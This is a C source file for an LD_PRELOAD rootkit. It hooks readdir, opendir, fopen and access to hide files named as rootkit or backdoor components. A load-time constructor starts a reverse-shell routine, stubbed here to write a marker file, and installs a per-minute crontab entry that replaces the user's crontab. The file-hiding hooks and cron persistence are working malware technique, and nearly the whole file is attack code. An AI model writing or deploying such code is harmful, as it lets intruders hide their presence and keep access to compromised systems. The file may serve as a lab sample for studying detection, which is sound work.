#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <time.h>
#include <errno.h>
#include <fcntl.h>
#include <ctype.h>

// Hidden process names
static const char* hidden_processes[] = {
    "backdoor",
    "rootkit",
    "ld.so.preload",
    "reverse_shell",
    ".rk",
    ".rk.so",
    NULL
};

// Hidden file names
static const char* hidden_files[] = {
    "rootkit",
    "backdoor",
    ".rk",
    ".rk.so",
    ".reverse_shell",
    ".rk_lock",
    "ld_preload_marker",
    NULL
};

// Check if a process should be hidden
int is_hidden_process(const char* name) {
    for (int i = 0; hidden_processes[i] != NULL; i++) {
        if (strstr(name, hidden_processes[i]) != NULL) {
            return 1;
        }
    }
    return 0;
}

// Check if a file should be hidden
int is_hidden_file(const char* name) {
    for (int i = 0; hidden_files[i] != NULL; i++) {
        if (strstr(name, hidden_files[i]) != NULL) {
            return 1;
        }
    }
    return 0;
}

// Hook readdir to hide files
struct dirent* (*original_readdir)(DIR *dirp) = NULL;

struct dirent* readdir(DIR *dirp) {
    if (original_readdir == NULL) {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }
    
    struct dirent* dir;
    while ((dir = original_readdir(dirp)) != NULL) {
        if (!is_hidden_file(dir->d_name)) {
            return dir;
        }
    }
    return NULL;
}

int is_number(const char *str) {
    while (*str) {
        if (!isdigit(*str)) {
            return 0;
        }
        str++;
    }
    return 1;
}

// Hook opendir to hide directories
DIR* (*original_opendir)(const char *name) = NULL;

DIR* opendir(const char *name) {
    if (is_hidden_file(name) || is_hidden_process(name)) {
        errno = ENOENT;
        return NULL;
    }
    
    if (original_opendir == NULL) {
        original_opendir = dlsym(RTLD_NEXT, "opendir");
    }
    
    return original_opendir(name);
}

// Hook fopen to hide files from file operations
FILE* (*original_fopen)(const char *pathname, const char *mode) = NULL;

FILE* fopen(const char *pathname, const char *mode) {
    if (is_hidden_file(pathname) || is_hidden_process(pathname)) {
        errno = ENOENT;
        return NULL;
    }
    
    if (original_fopen == NULL) {
        original_fopen = dlsym(RTLD_NEXT, "fopen");
    }
    
    return original_fopen(pathname, mode);
}

// Hook access to hide files from access checks
int (*original_access)(const char *pathname, int mode) = NULL;

int access(const char *pathname, int mode) {
    if (is_hidden_file(pathname) || is_hidden_process(pathname)) {
        errno = ENOENT;
        return -1;
    }
    
    if (original_access == NULL) {
        original_access = dlsym(RTLD_NEXT, "access");
    }
    
    return original_access(pathname, mode);
}

// Reverse shell function
void reverse_shell() {
    // Check if already running to prevent multiple instances
    FILE *check = fopen("/tmp/.rk_lock", "r");
    if (check != NULL) {
        fclose(check);
        // If lock file exists, clean up and exit
        unlink("/tmp/.rk_lock");
        unlink("/tmp/.reverse_shell_active");
        return;
    }
    
    // Create lock file
    FILE *lock = fopen("/tmp/.rk_lock", "w");
    if (lock != NULL) {
        fprintf(lock, "%d", getpid());
        fclose(lock);
    }
    
    // Fork to run in background
    if (fork() == 0) {
        // Child process - start reverse shell
        setsid();
        
        // In a real implementation, this would connect back to the attacker
        // For this example, we'll just create a marker file
        FILE *marker = fopen("/tmp/.reverse_shell_active", "w");
        if (marker != NULL) {
            fprintf(marker, "Reverse shell active at %s", __TIME__);
            fclose(marker);
        }
    }
}

// Add persistence through cron
void add_cron_persistence() {
    // Add to crontab for persistence
    system("echo '* * * * * /tmp/.reverse_shell' | crontab - 2>/dev/null");
}

// Initialization function
void __attribute__((constructor)) init() {
    // Add to LD_PRELOAD to make it persistent
    // In a real implementation, this would be more sophisticated
    // For this example, we'll just create a marker
    FILE *fp = fopen("/tmp/ld_preload_marker", "w");
    if (fp != NULL) {
        fprintf(fp, "LD_PRELOAD active\n");
        fclose(fp);
    }
    
    // Start reverse shell
    reverse_shell();
    
    // Add cron persistence
    add_cron_persistence();
}

// Cleanup function
void __attribute__((destructor)) cleanup() {
    // Cleanup code if needed
    // Remove our traces
    unlink("/tmp/.rk_lock");
    unlink("/tmp/.reverse_shell_active");
}
